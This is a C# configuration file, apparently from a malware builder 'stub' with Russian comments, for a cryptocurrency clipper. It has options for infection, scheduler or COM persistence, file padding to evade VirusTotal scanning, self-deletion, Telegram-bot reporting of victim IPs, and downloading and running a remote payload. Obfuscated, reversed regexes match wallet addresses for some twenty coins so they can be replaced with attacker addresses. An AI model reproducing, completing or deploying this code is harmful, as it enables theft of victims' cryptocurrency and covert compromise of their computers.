using Stub.Help;
using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Stub
{
    class Config
    {
        public static bool install = Convert.ToBoolean("[INSTALL]"); // Заражение true включено false выключено
        public static bool autoRun_Scheduler = Convert.ToBoolean("[RUN_SCHEDULER]");// Авто-загрузка если есть админ правала через планировщик заданий true включено false выключено
        public static bool autoRun_COM = Convert.ToBoolean("[RUN_COM]"); // Авто-загрузка через COM если нет админ прав true включено false выключено

        public static bool AddBytes = Convert.ToBoolean("[ADDDBYTES]");// Добавлять байты при заражении, например 750мб не залить на ВТ!
        public static int Addbkb = Convert.ToInt32("[ADDKB]"); // Увеличивать вес файла при заражении в килобайтах

        public static bool sourcefileDelete = Convert.ToBoolean("[DELETE]");// Самоудаление после заражения true включено false выключено

        public static bool fileReplacer = Convert.ToBoolean("[FILE_REPLACER]");// Поиск и замена кошельков в файлах true включено false выключено
        public static string[] searchFilesPatterns = "[FILES]".Split(',');

        public static bool tgNotifications = Convert.ToBoolean("[TG_API]"); // Уведомления в телеграм бота true включено false выключено
        public static string botToken = "[TOKEN]";
        public static string chatId = "[USER_ID]";
        public static bool get_ip = Convert.ToBoolean("[GET_IP]"); // получать IP в боте в телеграм бота true включено false выключено


        public static string buildVersion = "1.0.0";

        public static string sysDir = "[SYSDIR]";
        public static string dir = "[DIR]".Replace(" ", "_").Trim();
        public static string bin = "[BIN]".Replace(" ", "_").Trim();
        public static string taskName = "[TASKNAME]".Replace(" ", "_").Trim();
        public static string MutEx = "[MUTEX]".Replace(" ", "_").Trim();

        public static bool loader = Convert.ToBoolean("[LOADER]");
        public static string loaderFileUrl = "[LOADER_URL]"; // URL_файла для загрузки и запуска, если пустое значение то метод не выполняется

        public static bool api_get = Convert.ToBoolean("[API_GET]");
        public static string apiUrl = "[API_URL]"; // URL Для отстука, если пустое значение то метод не выполняется

        // Кошельки указываются через символ | в одну строчку, например заместо [ETH]:
        // 0x7C31f9d9dAc3F3E5e02214C372ec6d7A2752e01A|0x0349e003Bc2CE0FDC54B4814Be23D0457af08e01|и так далее
        public static Dictionary<Regex, string[]> addresses = new Dictionary<Regex, string[]>()
        {

            {new Regex(StringHelper.ReverseString(@"b\}43,52{]9-1Z-PN-JH-Az-mk-a[]3[b\")), "[BTC3]".Trim().Split('|') }, // Bitcoin кошельки которые начинаются на 3
            {new Regex(StringHelper.ReverseString(@"b\}43,52{]9-1Z-PN-JH-Az-mk-a[]1[b\")), "[BTC1]".Trim().Split('|') }, // Bitcoin кошельки которые начинаются на 1
            {new Regex(StringHelper.ReverseString(@"b\}14,53{]9-0Z-PN-JH-Az-a[]1cb[b\")), "[BC1]".Trim().Split('|') }, // Bitcoin кошельки которые начинаются на bc1
            {new Regex(StringHelper.ReverseString(@"b\}04{]9-0F-Af-a[x0b\")), "[ETH]".Trim().Split('|') }, // Ethereum Сеть ERC20 USDT и т.д
            {new Regex(StringHelper.ReverseString(@"b\}39{]z-mk-aZ-PN-JH-A9-1[]BA9-0[]4[b\")), "[XMR_4]".Trim().Split('|') }, // Monero которые начинаются на 4 
            {new Regex(StringHelper.ReverseString(@"b\}39{]z-mk-aZ-PN-JH-A9-1[]BA9-0[]8[b\")), "[XMR_8]".Trim().Split('|') }, // Monero которые начинаются на 8
            {new Regex(StringHelper.ReverseString(@"b\}55{]Z-Az-a9-0[Gb\")), "[XLM]".Trim().Split('|') }, // XLM
            {new Regex(StringHelper.ReverseString(@"b\}43,42{]Z-Az-a9-0[rb\")), "[XRP]".Trim().Split('|') }, // XRP
            {new Regex(StringHelper.ReverseString(@"b\}33,62{]9-1Z-PN-JH-Az-mk-a[Lb\")), "[LTC_L]".Trim().Split('|') }, // Lite Coin L
            {new Regex(StringHelper.ReverseString(@"b\}33,62{]9-1Z-PN-JH-Az-mk-a[Mb\")), "[LTC_M]".Trim().Split('|') }, // Lite Coin M
            {new Regex(StringHelper.ReverseString(@"b\}68,6{]9-0z-a[q1ctlb\")), "[LTC_ltc1q]".Trim().Split('|') }, // Lite Coin ltc1q
            {new Regex(StringHelper.ReverseString(@"b\}33{]Z-Az-a9-0[]NA[b\")), "[NEC]".Trim().Split('|') }, // NEC
            {new Regex(StringHelper.ReverseString(@"b\}14{]9-0z-a[)p|q(?):hsacnioctib(b\")), "[BCH]".Trim().Split('|') }, // BCH
            {new Regex(StringHelper.ReverseString(@"b\}33{]z-mk-aZ-PN-JH-A9-1[Xb\")), "[DASH]".Trim().Split('|') }, // DASH
            {new Regex(StringHelper.ReverseString(@"b\}33{]9-1Z-PN-JH-Az-mk-a[Db\")), "[DOGE]".Trim().Split('|') }, // Doge Coin
            {new Regex(StringHelper.ReverseString(@"b\}33,82{]9-0Z-Az-a[Tb\")), "[TRX]".Trim().Split('|') }, // Tron сеть TRC20, USDT и т.д
            {new Regex(StringHelper.ReverseString(@"b\}33{]z-A9-0[1tb\")), "[ZCASH]".Trim().Split('|') }, // ZCashe
            {new Regex(StringHelper.ReverseString(@"b\}93{]9-0z-a[bnbb\")), "[BNB]".Trim().Split('|') }, // Binance coin
            {new Regex(StringHelper.ReverseString(@"b\}84,64{]-_9-0z-aZ-A[)QE|QU(b\")), "[TON]".Trim().Split('|') }, // Ton
            {new Regex(StringHelper.ReverseString(@"b\}44{]z-mk-aZ-PN-JH-A9-1[b\")), "[SOL]".Trim().Split('|') }, // Solana SOL
            {new Regex(StringHelper.ReverseString(@"b\}74{]z-mk-aZ-PN-JH-A9-1[1b\")), "[DOT]".Trim().Split('|') }, // Polka DOT
            {new Regex(StringHelper.ReverseString(@"b\}83{]9-0z-a[1xava-Xb\")), "[AVAX]".Trim().Split('|') }, // Avalanche (AVAX) 
        };
    }
}
